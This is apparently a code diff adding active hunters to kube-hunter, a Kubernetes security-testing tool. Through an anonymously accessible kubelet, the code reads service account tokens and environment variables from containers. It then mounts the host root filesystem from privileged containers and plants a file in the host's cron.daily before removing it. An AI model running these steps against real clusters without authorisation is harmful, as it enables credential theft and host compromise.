@@ -1,10 +1,12 @@
 import json
 import logging
+import time
 from enum import Enum
 
 import re
 import requests
 import urllib3
+import uuid
 
 from kube_hunter.conf import get_config
 from kube_hunter.core.events import handler
@@ -117,6 +119,22 @@ class ExposedHealthzHandler(Vulnerability, Event):
         )
         self.status = status
         self.evidence = f"status: {self.status}"
+
+
+class ExposedExistingPrivilegedContainersViaSecureKubeletPort(Vulnerability, Event):
+    """A malicious actor, that has confirmed anonymous access to the API via the kubelet's secure port, \
+can leverage the existing privileged containers identified to damage the host and potentially \
+the whole cluster"""
+
+    def __init__(self, exposed_existing_privileged_containers):
+        Vulnerability.__init__(
+            self,
+            component=KubernetesCluster,
+            name="Exposed Existing Privileged Container(s) Via Secure Kubelet Port",
+            category=AccessRisk,
+            vid="KHV051",
+        )
+        self.exposed_existing_privileged_containers = exposed_existing_privileged_containers
 
 
 class PrivilegedContainers(Vulnerability, Event):
@@ -432,6 +450,520 @@ class SecureKubeletPortHunter(Hunter):
                         "container": container_data["name"],
                         "namespace": pod_data["metadata"]["namespace"],
                     }
+
+
+""" Active Hunters """
+
+
+@handler.subscribe(AnonymousAuthEnabled)
+class ProveAnonymousAuth(ActiveHunter):
+    """Foothold Via Secure Kubelet Port
+    Attempts to demonstrate that a malicious actor can establish foothold into the cluster via a
+    container abusing the configuration of the kubelet's secure port: authentication-auth=false.
+    """
+
+    def __init__(self, event):
+        self.event = event
+        self.base_url = "https://{host}:10250/".format(host=self.event.host)
+
+    def get_request(self, url, verify=False):
+        config = get_config()
+        try:
+            response_text = self.event.session.get(url=url, verify=verify, timeout=config.network_timeout).text.rstrip()
+
+            return response_text
+        except Exception as ex:
+            logging.debug("Exception: " + str(ex))
+            return "Exception: " + str(ex)
+
+    def post_request(self, url, params, verify=False):
+        config = get_config()
+        try:
+            response_text = self.event.session.post(
+                url=url, verify=verify, params=params, timeout=config.network_timeout
+            ).text.rstrip()
+
+            return response_text
+        except Exception as ex:
+            logging.debug("Exception: " + str(ex))
+            return "Exception: " + str(ex)
+
+    @staticmethod
+    def has_no_exception(result):
+        return "Exception: " not in result
+
+    @staticmethod
+    def has_no_error(result):
+        possible_errors = ["exited with", "Operation not permitted", "Permission denied", "No such file or directory"]
+
+        return not any(error in result for error in possible_errors)
+
+    @staticmethod
+    def has_no_error_nor_exception(result):
+        return ProveAnonymousAuth.has_no_error(result) and ProveAnonymousAuth.has_no_exception(result)
+
+    def cat_command(self, run_request_url, full_file_path):
+        return self.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
+
+    def process_container(self, run_request_url):
+        service_account_token = self.cat_command(run_request_url, "/var/run/secrets/kubernetes.io/serviceaccount/token")
+
+        environment_variables = self.post_request(run_request_url, {"cmd": "env"})
+
+        if self.has_no_error_nor_exception(service_account_token):
+            return {
+                "result": True,
+                "service_account_token": service_account_token,
+                "environment_variables": environment_variables,
+            }
+
+        return {"result": False}
+
+    def execute(self):
+        pods_raw = self.get_request(self.base_url + KubeletHandlers.PODS.value)
+
+        # At this point, the following must happen:
+        # a) we get the data of the running pods
+        # b) we get a forbidden message because the API server
+        # has a configuration that denies anonymous attempts despite the kubelet being vulnerable
+
+        if self.has_no_error_nor_exception(pods_raw) and "items" in pods_raw:
+            pods_data = json.loads(pods_raw)["items"]
+
+            temp_message = ""
+            exposed_existing_privileged_containers = list()
+
+            for pod_data in pods_data:
+                pod_namespace = pod_data["metadata"]["namespace"]
+                pod_id = pod_data["metadata"]["name"]
+
+                for container_data in pod_data["spec"]["containers"]:
+                    container_name = container_data["name"]
+
+                    run_request_url = self.base_url + "run/{}/{}/{}".format(pod_namespace, pod_id, container_name)
+
+                    extracted_data = self.process_container(run_request_url)
+
+                    if extracted_data["result"]:
+                        service_account_token = extracted_data["service_account_token"]
+                        environment_variables = extracted_data["environment_variables"]
+
+                        temp_message += (
+                            "\n\nPod namespace: {}".format(pod_namespace)
+                            + "\n\nPod ID: {}".format(pod_id)
+                            + "\n\nContainer name: {}".format(container_name)
+                            + "\n\nService account token: {}".format(service_account_token)
+                            + "\nEnvironment variables: {}".format(environment_variables)
+                        )
+
+                        first_check = container_data.get("securityContext", {}).get("privileged")
+
+                        first_subset = container_data.get("securityContext", {})
+                        second_subset = first_subset.get("capabilities", {})
+                        data_for_second_check = second_subset.get("add", [])
+
+                        second_check = "SYS_ADMIN" in data_for_second_check
+
+                        if first_check or second_check:
+                            exposed_existing_privileged_containers.append(
+                                {
+                                    "pod_namespace": pod_namespace,
+                                    "pod_id": pod_id,
+                                    "container_name": container_name,
+                                    "service_account_token": service_account_token,
+                                    "environment_variables": environment_variables,
+                                }
+                            )
+
+            if temp_message:
+                message = "The following containers have been successfully breached." + temp_message
+
+                self.event.evidence = "{}".format(message)
+
+            if exposed_existing_privileged_containers:
+                self.publish_event(
+                    ExposedExistingPrivilegedContainersViaSecureKubeletPort(
+                        exposed_existing_privileged_containers=exposed_existing_privileged_containers
+                    )
+                )
+
+
+@handler.subscribe(ExposedExistingPrivilegedContainersViaSecureKubeletPort)
+class MaliciousIntentViaSecureKubeletPort(ActiveHunter):
+    """Malicious Intent Via Secure Kubelet Port
+    Attempts to demonstrate that a malicious actor can leverage existing privileged containers
+    exposed via the kubelet's secure port, due to anonymous auth enabled misconfiguration,
+    such that a process can be started or modified on the host.
+    """
+
+    def __init__(self, event, seconds_to_wait_for_os_command=1):
+        self.event = event
+        self.base_url = "https://{host}:10250/".format(host=self.event.host)
+        self.seconds_to_wait_for_os_command = seconds_to_wait_for_os_command
+        self.number_of_rm_attempts = 5
+        self.number_of_rmdir_attempts = 5
+        self.number_of_umount_attempts = 5
+
+    def post_request(self, url, params, verify=False):
+        config = get_config()
+        try:
+            response_text = self.event.session.post(
+                url, verify, params=params, timeout=config.network_timeout
+            ).text.rstrip()
+
+            return response_text
+        except Exception as ex:
+            logging.debug("Exception: " + str(ex))
+            return "Exception: " + str(ex)
+
+    def cat_command(self, run_request_url, full_file_path):
+        return self.post_request(run_request_url, {"cmd": "cat {}".format(full_file_path)})
+
+    def clean_attacked_exposed_existing_privileged_container(
+        self,
+        run_request_url,
+        file_system_or_partition,
+        directory_created,
+        file_created,
+        number_of_rm_attempts,
+        number_of_umount_attempts,
+        number_of_rmdir_attempts,
+        seconds_to_wait_for_os_command,
+    ):
+
+        self.rm_command(
+            run_request_url,
+            "{}/etc/cron.daily/{}".format(directory_created, file_created),
+            number_of_rm_attempts,
+            seconds_to_wait_for_os_command,
+        )
+
+        self.umount_command(
+            run_request_url,
+            file_system_or_partition,
+            directory_created,
+            number_of_umount_attempts,
+            seconds_to_wait_for_os_command,
+        )
+
+        self.rmdir_command(
+            run_request_url, directory_created, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
+        )
+
+    def check_file_exists(self, run_request_url, file):
+        file_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=file)
+
+        return ProveAnonymousAuth.has_no_error_nor_exception(file_exists)
+
+    def rm_command(self, run_request_url, file_to_remove, number_of_rm_attempts, seconds_to_wait_for_os_command):
+        if self.check_file_exists(run_request_url, file_to_remove):
+            for _ in range(number_of_rm_attempts):
+                command_execution_outcome = self.post_request(
+                    run_request_url, {"cmd": "rm -f {}".format(file_to_remove)}
+                )
+
+                if seconds_to_wait_for_os_command:
+                    time.sleep(seconds_to_wait_for_os_command)
+
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
+                second_check = self.check_file_exists(run_request_url, file_to_remove)
+
+                if first_check and not second_check:
+                    return True
+
+        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
+        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
+        logger.warning(
+            "kube-hunter: "
+            + "POD="
+            + pod_id
+            + ", "
+            + "CONTAINER="
+            + container_name
+            + " - Unable to remove file: "
+            + file_to_remove
+        )
+
+        return False
+
+    def chmod_command(self, run_request_url, permissions, file):
+        return self.post_request(run_request_url, {"cmd": "chmod {} {}".format(permissions, file)})
+
+    def touch_command(self, run_request_url, file_to_create):
+        return self.post_request(run_request_url, {"cmd": "touch {}".format(file_to_create)})
+
+    def attack_exposed_existing_privileged_container(
+        self, run_request_url, directory_created, number_of_rm_attempts, seconds_to_wait_for_os_command, file_name=None
+    ):
+        if file_name is None:
+            file_name = "kube-hunter" + str(uuid.uuid1())
+
+        file_name_with_path = "{}/etc/cron.daily/{}".format(directory_created, file_name)
+
+        file_created = self.touch_command(run_request_url, file_name_with_path)
+
+        if ProveAnonymousAuth.has_no_error_nor_exception(file_created):
+            permissions_changed = self.chmod_command(run_request_url, "755", file_name_with_path)
+
+            if ProveAnonymousAuth.has_no_error_nor_exception(permissions_changed):
+                return {"result": True, "file_created": file_name}
+
+            self.rm_command(run_request_url, file_name_with_path, number_of_rm_attempts, seconds_to_wait_for_os_command)
+
+        return {"result": False}
+
+    def check_directory_exists(self, run_request_url, directory):
+        directory_exists = self.ls_command(run_request_url=run_request_url, file_or_directory=directory)
+
+        return ProveAnonymousAuth.has_no_error_nor_exception(directory_exists)
+
+    def rmdir_command(
+        self, run_request_url, directory_to_remove, number_of_rmdir_attempts, seconds_to_wait_for_os_command,
+    ):
+        if self.check_directory_exists(run_request_url, directory_to_remove):
+            for _ in range(number_of_rmdir_attempts):
+                command_execution_outcome = self.post_request(
+                    run_request_url, {"cmd": "rmdir {}".format(directory_to_remove)}
+                )
+
+                if seconds_to_wait_for_os_command:
+                    time.sleep(seconds_to_wait_for_os_command)
+
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
+                second_check = self.check_directory_exists(run_request_url, directory_to_remove)
+
+                if first_check and not second_check:
+                    return True
+
+        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
+        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
+        logger.warning(
+            "kube-hunter: "
+            + "POD="
+            + pod_id
+            + ", "
+            + "CONTAINER="
+            + container_name
+            + " - Unable to remove directory: "
+            + directory_to_remove
+        )
+
+        return False
+
+    def ls_command(self, run_request_url, file_or_directory):
+        return self.post_request(run_request_url, {"cmd": "ls {}".format(file_or_directory)})
+
+    def umount_command(
+        self,
+        run_request_url,
+        file_system_or_partition,
+        directory,
+        number_of_umount_attempts,
+        seconds_to_wait_for_os_command,
+    ):
+        # Note: the logic implemented proved more reliable than using "df"
+        # command to resolve for mounted systems/partitions.
+        current_files_and_directories = self.ls_command(run_request_url, directory)
+
+        if self.ls_command(run_request_url, directory) == current_files_and_directories:
+            for _ in range(number_of_umount_attempts):
+                # Ref: http://man7.org/linux/man-pages/man2/umount.2.html
+                command_execution_outcome = self.post_request(
+                    run_request_url, {"cmd": "umount {} {}".format(file_system_or_partition, directory)}
+                )
+
+                if seconds_to_wait_for_os_command:
+                    time.sleep(seconds_to_wait_for_os_command)
+
+                first_check = ProveAnonymousAuth.has_no_error_nor_exception(command_execution_outcome)
+                second_check = self.ls_command(run_request_url, directory) != current_files_and_directories
+
+                if first_check and second_check:
+                    return True
+
+        pod_id = run_request_url.replace(self.base_url + "run/", "").split("/")[1]
+        container_name = run_request_url.replace(self.base_url + "run/", "").split("/")[2]
+        logger.warning(
+            "kube-hunter: "
+            + "POD="
+            + pod_id
+            + ", "
+            + "CONTAINER="
+            + container_name
+            + " - Unable to unmount "
+            + file_system_or_partition
+            + " at: "
+            + directory
+        )
+
+        return False
+
+    def mount_command(self, run_request_url, file_system_or_partition, directory):
+        # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
+        return self.post_request(run_request_url, {"cmd": "mount {} {}".format(file_system_or_partition, directory)})
+
+    def mkdir_command(self, run_request_url, directory_to_create):
+        # Ref: http://man7.org/linux/man-pages/man1/mkdir.1.html
+        return self.post_request(run_request_url, {"cmd": "mkdir {}".format(directory_to_create)})
+
+    def findfs_command(self, run_request_url, file_system_or_partition_type, file_system_or_partition):
+        # Ref: http://man7.org/linux/man-pages/man8/findfs.8.html
+        return self.post_request(
+            run_request_url, {"cmd": "findfs {}{}".format(file_system_or_partition_type, file_system_or_partition)}
+        )
+
+    def get_root_values(self, command_line):
+        for command in command_line.split(" "):
+            # Check for variable-definition commands as there can be commands which don't define variables.
+            if "=" in command:
+                split = command.split("=")
+                if split[0] == "root":
+                    if len(split) > 2:
+                        # Potential valid scenario: root=LABEL=example
+                        root_value_type = split[1] + "="
+                        root_value = split[2]
+
+                        return root_value, root_value_type
+                    else:
+                        root_value_type = ""
+                        root_value = split[1]
+
+                        return root_value, root_value_type
+
+        return None, None
+
+    def process_exposed_existing_privileged_container(
+        self,
+        run_request_url,
+        number_of_umount_attempts,
+        number_of_rmdir_attempts,
+        seconds_to_wait_for_os_command,
+        directory_to_create=None,
+    ):
+        if directory_to_create is None:
+            directory_to_create = "/kube-hunter_" + str(uuid.uuid1())
+
+        # /proc/cmdline - This file shows the parameters passed to the kernel at the time it is started.
+        command_line = self.cat_command(run_request_url, "/proc/cmdline")
+
+        if ProveAnonymousAuth.has_no_error_nor_exception(command_line):
+            if len(command_line.split(" ")) > 0:
+                root_value, root_value_type = self.get_root_values(command_line)
+
+                # Move forward only when the "root" variable value was actually defined.
+                if root_value:
+                    if root_value_type:
+                        file_system_or_partition = self.findfs_command(run_request_url, root_value_type, root_value)
+                    else:
+                        file_system_or_partition = root_value
+
+                    if ProveAnonymousAuth.has_no_error_nor_exception(file_system_or_partition):
+                        directory_created = self.mkdir_command(run_request_url, directory_to_create)
+
+                        if ProveAnonymousAuth.has_no_error_nor_exception(directory_created):
+                            directory_created = directory_to_create
+
+                            mounted_file_system_or_partition = self.mount_command(
+                                run_request_url, file_system_or_partition, directory_created
+                            )
+
+                            if ProveAnonymousAuth.has_no_error_nor_exception(mounted_file_system_or_partition):
+                                host_name = self.cat_command(
+                                    run_request_url, "{}/etc/hostname".format(directory_created)
+                                )
+
+                                if ProveAnonymousAuth.has_no_error_nor_exception(host_name):
+                                    return {
+                                        "result": True,
+                                        "file_system_or_partition": file_system_or_partition,
+                                        "directory_created": directory_created,
+                                    }
+
+                                self.umount_command(
+                                    run_request_url,
+                                    file_system_or_partition,
+                                    directory_created,
+                                    number_of_umount_attempts,
+                                    seconds_to_wait_for_os_command,
+                                )
+
+                            self.rmdir_command(
+                                run_request_url,
+                                directory_created,
+                                number_of_rmdir_attempts,
+                                seconds_to_wait_for_os_command,
+                            )
+
+        return {"result": False}
+
+    def execute(self, directory_to_create=None, file_name=None):
+        temp_message = ""
+
+        for exposed_existing_privileged_containers in self.event.exposed_existing_privileged_containers:
+            pod_namespace = exposed_existing_privileged_containers["pod_namespace"]
+            pod_id = exposed_existing_privileged_containers["pod_id"]
+            container_name = exposed_existing_privileged_containers["container_name"]
+
+            run_request_url = self.base_url + "run/{}/{}/{}".format(pod_namespace, pod_id, container_name)
+
+            is_exposed_existing_privileged_container_privileged = self.process_exposed_existing_privileged_container(
+                run_request_url,
+                self.number_of_umount_attempts,
+                self.number_of_rmdir_attempts,
+                self.seconds_to_wait_for_os_command,
+                directory_to_create,
+            )
+
+            if is_exposed_existing_privileged_container_privileged["result"]:
+                file_system_or_partition = is_exposed_existing_privileged_container_privileged[
+                    "file_system_or_partition"
+                ]
+                directory_created = is_exposed_existing_privileged_container_privileged["directory_created"]
+
+                # Execute attack attempt: start/modify process in host.
+                attack_successful_on_exposed_privileged_container = self.attack_exposed_existing_privileged_container(
+                    run_request_url,
+                    directory_created,
+                    self.number_of_rm_attempts,
+                    self.seconds_to_wait_for_os_command,
+                    file_name,
+                )
+
+                if attack_successful_on_exposed_privileged_container["result"]:
+                    file_created = attack_successful_on_exposed_privileged_container["file_created"]
+
+                    self.clean_attacked_exposed_existing_privileged_container(
+                        run_request_url,
+                        file_system_or_partition,
+                        directory_created,
+                        file_created,
+                        self.number_of_rm_attempts,
+                        self.number_of_umount_attempts,
+                        self.number_of_rmdir_attempts,
+                        self.seconds_to_wait_for_os_command,
+                    )
+
+                    temp_message += "\n\nPod namespace: {}\n\nPod ID: {}\n\nContainer name: {}".format(
+                        pod_namespace, pod_id, container_name
+                    )
+
+        if temp_message:
+            message = (
+                "The following exposed existing privileged containers"
+                + " have been successfully abused by starting/modifying a process in the host."
+                + temp_message
+            )
+
+            self.event.evidence = "{}".format(message)
+        else:
+            message = (
+                "The following exposed existing privileged containers"
+                + " were not successfully abused by starting/modifying a process in the host."
+                + "Keep in mind that attackers might use other methods to attempt to abuse them."
+                + temp_message
+            )
+
+            self.event.evidence = "{}".format(message)
 
 
 @handler.subscribe(ExposedRunHandler)
